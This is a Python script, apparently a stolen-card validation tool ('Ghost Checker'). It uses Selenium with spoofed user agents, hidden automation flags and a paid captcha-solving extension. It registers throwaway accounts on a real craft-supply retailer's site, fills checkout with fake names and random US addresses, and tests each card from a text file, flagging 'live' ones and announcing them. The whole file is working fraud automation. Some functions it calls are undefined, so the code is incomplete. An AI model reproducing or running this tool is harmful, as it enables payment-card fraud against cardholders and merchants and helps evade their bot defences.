import numpy as np
from fake_useragent import UserAgent
import pandas as pd
import time, ntplib, requests, random, subprocess, colorama, pycountry,flag,hashlib,sys,json,names
from playsound import playsound
from tkinter import messagebox
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from datetime import datetime
from colorama import Fore, Back, Style
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.action_chains import ActionChains



version = '1.7'
colorama.init(autoreset=True)
bot = 'Usuarios'
livesound = "live.mp3"
gate= 'SAmerica'

def check(bin):
    global det, bindata,bankdata,paisbande
    response = requests.get(url='https://bins.ws/search?bins=' + str(bin) + '&bank=&country=')

    if response.status_code == 200:
        respuesta = response.text
        soup = BeautifulSoup(respuesta, 'html.parser')
        table = soup.find('table', {'class': 'dataframe'})
        rows = table.find_all('tr')
        data = []

        for row in rows[1:]:  # 4 Skip the header row
            cells = row.find_all('td')
            row_data = []
            for cell in cells:
                row_data.append(cell.text.strip())
            data.append(row_data)

        bin = data[0][0]
        type = data[0][1]
        level = data[0][2]
        brand = data[0][3]
        bank = data[0][4]
        country = data[0][5]
        pais = pycountry.countries.get(alpha_2=country)
        pais = str(pais.name)

        det = '[' + bin + ']' + '|' + brand + '|' + type + '|' + level + '|' + bank + '|' + pais.upper()
        bincolor = Fore.WHITE + Back.BLUE + Style.BRIGHT + f'\r{det}'
        bindata= f"{brand} - {type} - {level}"
        bankdata = bank
        paisbande= f"{pais} - {flag.flag(country)}"

    else:
        det = ' [' + bin + ']'
        bincolor = Fore.BLACK + Back.YELLOW + Style.BRIGHT + f'\nEl sistema de información ha caido.'

    return print(bincolor)

def leer_tarjetas():
    with open("tarjetas.txt", "r") as archivo:
        return archivo.readlines()

def real_random_address() -> dict:
    with open('./necesarios/addresses-us-all.min.json', 'r') as source_filename:
        data = json.load(source_filename)
    return random.choice(data.get('addresses'))


def wait_and_check_captcha_solved(driver):
    start_time = time.time()

    # Espera hasta que el captcha esté resuelto o hasta que se agote el tiempo máximo (120 segundos)
    try:
        WebDriverWait(driver, 120, poll_frequency=0.5).until(
            lambda driver: driver.find_element(By.ID, "recaptcha-anchor").get_attribute("aria-checked") == "true"
        )
        solved = True
    except:
        solved = False

    end_time = time.time()
    elapsed_time = end_time - start_time  # Tiempo en segundos

    return solved, elapsed_time

def determinar_tipo_tarjeta(numero_tarjeta):
    # Convertir la variable a string para facilitar la manipulación
    numero_tarjeta = str(numero_tarjeta)

    # Asegurar que la longitud sea correcta (16 dígitos para Visa, MasterCard y Discover, 15 para American Express)
    if len(numero_tarjeta) not in [15, 16]:
        return "Número de tarjeta inválido"

    primer_digito = numero_tarjeta[0]

    if primer_digito == '4':
        return "VISA"
    elif primer_digito == '5':
        return "MasterCard"
    elif primer_digito == '3' and len(numero_tarjeta) == 15:
        return "Amex"
    elif primer_digito == '6':
        return "Discover"
    else:
        return "Marca desconocida o número de tarjeta inválido"

def banner():

    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + f"""
    ____  __                                  ____        __      
   / __ \/ /_  __  ___________ _      __     / __ )____  / /______
  / /_/ / __ \/ / / / ___/ __ \ | /| / /    / __  / __ \/ __/ ___/
 / ____/ / / / /_/ / /  / /_/ / |/ |/ /    / /_/ / /_/ / /_(__  ) 
/_/   /_/ /_/\__, /_/   \____/|__/|__/    /_____/\____/\__/____/  
            /____/                                                
=============================== Sgate  ==============================""")

def inichromedrive():

    ua = UserAgent()
    my_user_agent = ua.random
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument(f"--user-agent={my_user_agent}")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    #chrome_options.add_argument('--headless=new')
    #chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-infobars')
    chrome_options.add_argument('--log-level=3')
    #chrome_options.add_argument('--incognito')
    chrome_options.add_argument('--disable-popup-blocking')
    chrome_options.add_argument('--extensions-on-chrome-urls')
    chrome_options.add_argument('--test-type')
    chrome_options.add_argument('--start-minimized')
   # chrome_options.add_argument("--window-position=-2000,-1100")
    chrome_options.add_argument("window-size=1920,1080")
    chrome_options.add_argument('--disable-cache')
    chrome_options.add_argument('--delete-cookies')
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_extension('AdBlock.crx')
    chrome_options.add_extension('captcha.crx')

    chrome_options.add_experimental_option("excludeSwitches", ['enable-automation','enable-logging' ])
    driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()),options=chrome_options)
    wait = WebDriverWait(driver, 10)
    #os.system('cls')
    return driver, wait

def Account(driver,wait):

    apiCaptcha = np.loadtxt("api.txt", dtype="str")
    driver.get('chrome-extension://pabjfbciaedomjjfelfafejkppknjleh/popup.html')
    wait.until(EC.visibility_of_element_located((By.ID, 'client-key-input'))).send_keys(str(apiCaptcha))
    driver.find_element(By.ID, 'client-key-save-btn').click()
    time.sleep(6)
    driver.switch_to.window(driver.window_handles[0])
    driver.get('https://www.mohmal.com/es')
    sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rGenerando correo......................")
    time.sleep(3)

    try:
        driver.find_element(By.XPATH,"//p[contains(text(), 'Consentir')]").click()
        time.sleep(3)
    except:
        pass

    wait.until(EC.visibility_of_element_located((By.ID, 'rand'))).click()
    wait.until(EC.visibility_of_element_located((By.ID, 'delete')))
    correo= driver.find_element(By.XPATH, '/html/body/div/div[1]/div[2]/div[3]/div[1]').text
    driver.switch_to.window(driver.window_handles[1])
    driver.get('https://www.silhouetteamerica.com/')

    try:
        sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rWaiting for Captcha 1....................")
        wait.until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,'/html/body/div[7]/div/div/div/div/div/div/div/form/div[2]/fieldset/div[11]/div[1]/div/div/div/iframe')))
        try:
            sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rSolving Captcha 1...................")
            cap_status, cap_time=wait_and_check_captcha_solved(driver)
            sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rCaptcha Solved 1.....................")
        except TimeoutException:
            print("Waiting for CAPTCHA solving timed out.")
    except:
        sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rNo Captcha Detected 1.....................")
        pass

    driver.switch_to.default_content()
    try:
        driver.find_element(By.ID,'accountDropdownList').click()
    except:
        driver.find_element(By.XPATH,"//span[contains(text(), 'account_circle')]").click()

    wait.until(EC.visibility_of_element_located((By.XPATH, "//a[contains(text(), 'OKAY')]"))).click()
    wait.until(EC.visibility_of_element_located((By.NAME,'nameInput'))).send_keys(names.get_full_name()+Keys.TAB+correo+Keys.TAB+correo+Keys.TAB+'Darkmakeee1'+Keys.TAB+'Darkmakeee1')

    try:
        sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rWaiting for Captcha 2....................")
        wait.until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,'/html/body/div[7]/div/div/div/div/div/div/div/form/div[2]/fieldset/div[11]/div[1]/div/div/div/iframe')))
        try:
            sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rSolving Captcha 2...................")
            cap_status, cap_time=wait_and_check_captcha_solved(driver)
            sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rCaptcha Solved 2.....................")
        except TimeoutException:
            print("Waiting for CAPTCHA solving timed out.")
    except:
        sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rNo Captcha Detected 2.....................")
        pass

    driver.switch_to.default_content()
    #driver.find_element(By.ID,'emailInput').send_keys(correo)
    #wait.until(EC.element_to_be_clickable((By.ID,'privacyPolicyCheckbox'))).click()
    checkbox1 = driver.find_element(By.ID, 'privacyPolicyCheckbox')
    driver.execute_script("arguments[0].click();", checkbox1)
    checkbox2 = driver.find_element(By.ID, 'termsConditionsCheckbox')
    driver.execute_script("arguments[0].click();", checkbox2)
    checkbox3 = driver.find_element(By.ID, 'ageCheckbox')
    driver.execute_script("arguments[0].click();", checkbox3)
    time.sleep(1)
    #wait.until(EC.element_to_be_clickable((By.XPATH,'/html/body/div[8]/div/div/div/div/div/div/div/form/div[2]/fieldset/div[11]/button'))).click()
    reg_button=driver.find_element(By.XPATH,'/html/body/div[7]/div/div/div/div/div/div/div/form/div[2]/fieldset/div[11]/button')
    driver.execute_script("arguments[0].click();", reg_button)
    time.sleep(4)
    driver.switch_to.window(driver.window_handles[0])
    sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rEsperando codigo......................")
    driver.find_element(By.ID,'renew').click()
    wait.until(EC.visibility_of_element_located((By.XPATH, "//a[contains(text(), 'Silhouette Account Verification')]"))).click()
    wait.until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,'/html/body/div/div[1]/div[7]/div/div[2]/iframe')))
    link =wait.until(EC.visibility_of_element_located((By.XPATH,'/html/body/table/tbody/tr/td/table/tbody/tr[4]/td/table/tbody/tr[4]/td/a'))).text
    driver.get(link)
    driver.switch_to.default_content()
    sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rCuenta creada con exito.......................")

def add_to_cart(driver,wait):
    driver.switch_to.window(driver.window_handles[1])
    driver.get('https://www.silhouetteamerica.com/shop/general-tools/TOOL-02-3T')
    wait.until(EC.element_to_be_clickable((By.XPATH, "//a[contains(text(), 'ADD TO CART')]"))).click()
    wait.until(EC.visibility_of_element_located((By.XPATH, "//a[contains(text(), 'Checkout')]")))
    driver.get('https://www.silhouetteamerica.com/cart')
    wait.until(EC.element_to_be_clickable((By.ID, 'cart-checkout'))).click()
    wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Continue Checkout')]"))).click()
    wait.until(EC.element_to_be_clickable((By.XPATH, "//a[contains(text(), '+ add new')]"))).click()

def probador(driver,wait,cc,mes,ano,cvv,nro):
    response=''
    address = real_random_address()

    sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rWaiting for Captcha....................")
    wait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, "iframe[src^='https://www.google.com/recaptcha/api2/anchor']")))
    try:
        sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rSolving Captcha...................")
        cap_status, cap_time=wait_and_check_captcha_solved(driver)
        sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rCaptcha Solved.....................")
    except TimeoutException:
        print("Waiting for CAPTCHA solving timed out.")

    if nro==1:
        pass
    else:
        if int(cap_time) < 30:
            time.sleep(30 - int(cap_time))

    driver.switch_to.default_content()
    wait.until(EC.visibility_of_element_located((By.ID, 'name-on-card')))
    nombre = driver.find_element(By.ID,'name-on-card').get_attribute('value')

    if nombre=='':
        driver.find_element(By.ID, 'name-on-card').send_keys(names.get_full_name())
        driver.find_element(By.ID,'newAddress').send_keys(address["address1"])
        driver.find_element(By.ID, 'newCity').send_keys(address["city"])
        sel_state = Select(driver.find_element(By.ID, 'state-select'))
        sel_state.select_by_value(address["state"])
        driver.find_element(By.ID, 'newZip').send_keys(address["postalCode"])
        driver.find_element(By.ID, 'newPhone').send_keys('3059' + str(random.randint(300000, 900000)))

    sel_cc_type = Select(driver.find_element(By.NAME, 'card_type'))
    sel_cc_type.select_by_value(determinar_tipo_tarjeta(cc))
    driver.find_element(By.ID,'card-number').send_keys(cc)
    sel_mes = Select(driver.find_element(By.NAME, 'exp_month'))
    sel_mes.select_by_value(mes)
    sel_ano = Select(driver.find_element(By.NAME, 'exp_year'))
    sel_ano.select_by_value(ano)
    driver.find_element(By.NAME,'cvv').send_keys(cvv)
    save_card = driver.find_element(By.ID,'btn-save-card')
    driver.execute_script("arguments[0].click();", save_card)
    time.sleep(2)

    if 'Continue Checkout' in driver.page_source:
        response='live'
        return response
    else:
        response=driver.find_element(By.XPATH,'/html/body/div[4]/div/div/div/div').text
        return response

def main():
    #batch_file_path = "CLEANER.bat"
    #subprocess.call([batch_file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

    driver, wait = inichromedrive()
    banner()
    Account(driver, wait)
    add_to_cart(driver, wait)
    tarjetas=leer_tarjetas()
    maxtries = 4
    print(Back.RESET+Fore.WHITE + Style.BRIGHT + f'\n=====================================================================')
    tarjeta = tarjetas.pop(0)
    cc, mes, ano, cvv = tarjeta.strip().split('|')
    check(str(cc[:6]))
    BINnum = str(cc[:6])
    print(Back.RESET + Fore.WHITE + Style.BRIGHT + f'=====================================================================')

    nro=1
    while tarjetas:

        tarjeta = tarjetas.pop(0)
        cc,mes,ano, cvv=tarjeta.strip().split('|')

        if nro==6:
            driver.delete_all_cookies()
            driver.close()
            driver.quit()
            driver, wait = inichromedrive()
            Account(driver, wait)
            add_to_cart(driver, wait)
            nro = 1

        fullcc=f'{cc}|{mes}|{ano}|{cvv}'
        inicio = time.time()
        response = probador(driver, wait, cc, mes, ano,cvv,nro)
        fin = time.time()
        duracion = fin - inicio

        with open("tarjetas.txt", "w") as archivo:
            archivo.writelines(tarjetas)

        if response=='live':

            message = f"              𝙂𝙝𝙤𝙨𝙩 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 \n"
            message += f"===================================\n"
            message += f" 𝘾𝙖𝙧𝙙 ➻ {fullcc}\n"
            message += f" 𝙎𝙩𝙖𝙩𝙪𝙨 ➻ Approved Chargued ✅ \n"
            message += f" 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➻ {gate}\n"  # Agregar el número de puntos
            message += f"───────────────────────────\n"
            message += f" 𝘽𝙞𝙣 𝘿𝙖𝙩𝙖 ➻ {BINnum} - {bindata}\n"
            message += f" 𝘽𝙖𝙣𝙠 𝘿𝙖𝙩𝙖 ➻ {bankdata}\n"
            message += f" 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➻ {paisbande}\n"
            message += f"───────────────────────────\n"
            message += f" 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝘽𝙮 ➻ {user}\n"
            send_msg(message)
            playsound(livesound)
            print("\r" + Fore.LIGHTBLACK_EX + f"[{nro}] ➻ " + Fore.GREEN + Style.BRIGHT + " [LIVE] ➻ " + fullcc +Fore.LIGHTBLACK_EX + f" ➻ [ {duracion:.2f} seg ] "+ "\n",end="")
            wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Continue Checkout')]"))).click()
            wait.until(EC.element_to_be_clickable((By.XPATH, "//a[contains(text(), '+ add new')]"))).click()
            nro += 1
            if nro==6:
                continue
            else:
                sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rWaiting for cooldown to finish...")

        elif 'Expired Card' in response:
            message = f"              𝙂𝙝𝙤𝙨𝙩 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 \n"
            message += f"===================================\n"
            message += f" 𝘾𝙖𝙧𝙙 ➻ {fullcc}\n"
            message += f" 𝙎𝙩𝙖𝙩𝙪𝙨 ➻ Approved - Expired Card ✅ \n"
            message += f" 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➻ {gate}\n"  # Agregar el número de puntos
            message += f"───────────────────────────\n"
            message += f" 𝘽𝙞𝙣 𝘿𝙖𝙩𝙖 ➻ {BINnum} - {bindata}\n"
            message += f" 𝘽𝙖𝙣𝙠 𝘿𝙖𝙩𝙖 ➻ {bankdata}\n"
            message += f" 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➻ {paisbande}\n"
            message += f"───────────────────────────\n"
            message += f" 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝘽𝙮 ➻ {user}\n"
            send_msg(message)
            playsound(livesound)
            print("\r" + Fore.LIGHTBLACK_EX + f"[{nro}] ➻ " + Fore.YELLOW + Style.BRIGHT + " [DIE] ➻ " + fullcc +Fore.LIGHTBLACK_EX + f" ➻ [ {duracion:.2f} seg ] "+ response + "\n",end="")
            nro += 1
            if nro == 6:
                continue
            else:
                sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rWaiting for cooldown to finish...")

        elif 'Insufficient Funds' in response:
            message = f"              𝙂𝙝𝙤𝙨𝙩 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 \n"
            message += f"===================================\n"
            message += f" 𝘾𝙖𝙧𝙙 ➻ {fullcc}\n"
            message += f" 𝙎𝙩𝙖𝙩𝙪𝙨 ➻ Approved Insufficient Funds ✅ \n"
            message += f" 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➻ {gate}\n"  # Agregar el número de puntos
            message += f"───────────────────────────\n"
            message += f" 𝘽𝙞𝙣 𝘿𝙖𝙩𝙖 ➻ {BINnum} - {bindata}\n"
            message += f" 𝘽𝙖𝙣𝙠 𝘿𝙖𝙩𝙖 ➻ {bankdata}\n"
            message += f" 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➻ {paisbande}\n"
            message += f"───────────────────────────\n"
            message += f" 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝘽𝙮 ➻ {user}\n"
            send_msg(message)
            playsound(livesound)
            print("\r" + Fore.LIGHTBLACK_EX + f"[{nro}] ➻ " + Fore.YELLOW + Style.BRIGHT + " [DIE] ➻ " + fullcc +Fore.LIGHTBLACK_EX + f" ➻ [ {duracion:.2f} seg ] "+ response + "\n",end="")
            nro += 1
            if nro == 6:
                continue
            else:
                sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rWaiting for cooldown to finish...")

        else:
            print("\r" + Fore.LIGHTBLACK_EX + f"[{nro}] ➻ " + Fore.RED + Style.BRIGHT + " [DIE] ➻ " + fullcc +Fore.LIGHTBLACK_EX + f" ➻ [ {duracion:.2f} seg ] "+ response + "\n",end="")
            nro += 1
            if nro == 6:
                continue
            else:
                sys.stdout.write(Fore.WHITE + Back.BLUE + Style.BRIGHT + f"\rWaiting for cooldown to finish...")

if __name__ == "__main__":
    Key_check()
